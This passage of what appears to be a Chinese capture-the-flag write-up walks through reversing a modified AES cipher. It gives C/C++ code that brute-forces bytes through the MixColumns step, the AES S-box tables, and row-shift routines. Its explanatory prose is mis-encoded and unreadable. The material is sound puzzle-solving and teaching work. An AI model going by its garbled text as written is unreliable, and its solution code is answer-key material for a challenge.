class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (a &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmpæ˜¯è¾“å…¥å€¼ï¼Œciphertextæ˜¯è¾“å‡ºå€¼ï¼Œè¿™é‡Œå·²çŸ¥ciphertextï¼Œæƒ³æ±‚tmpï¼Œæƒ³äº†ä¸€ä¸‹ç›¸äº’çš„å…³ç³»ï¼Œå‘ç°ciphertextç›¸äº’å¼‚æˆ–å°±æ˜¯tï¼Œæ‰€ä»¥æˆ‘å°è¯•çˆ†ç ´tmpçš„å€¼ï¼Œç”±äºæ¯ä¸ªtmpæ˜¯8ä½ï¼Œæ¯ä¸¤ä¸ªè¿›è¡Œä¸€æ¬¡æ£€æŸ¥ï¼Œæ‰€ä»¥ç›¸å½“äºæ˜¯çˆ†16ä½ï¼Œä½æ•°æ¯”è¾ƒå°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ mul2(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ mul2(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ mul2(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ mul2(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæµ‹è¯•ä¸‹æ¥ç¡®å®å¯ä»¥å¾—åˆ°ä¸€å¼€å§‹çš„ç­”æ¡ˆï¼Œæ‰€ä»¥æœ€å</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line"><span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line"><span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> INV_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line"><span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line"><span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line"><span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">shift_rows</span><span class="params">(<span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">temp = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = *state;</span><br><span class="line">*state = temp;</span><br><span class="line">tempa = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = tempa;</span><br><span class="line">tempb = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = tempb;</span><br><span class="line">tempc = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = tempc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">inv_shiftrows</span><span class="params">( <span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//temp = state[12];</span></span><br><span class="line"><span class="comment">//state[12] = state[8];</span></span><br><span class="line"><span class="comment">//state[8] = state[4];</span></span><br><span class="line"><span class="comment">//state[4] = *state;</span></span><br><span class="line"><span class="comment">//*state = temp;</span></span><br><span class="line"></span><br><span class="line">temp = *state;</span><br><span class="line">*state = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = temp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempa = state[1];</span></span><br><span class="line"><span class="comment">//state[1] = state[9];</span></span><br><span class="line"><span class="comment">//state[9] = 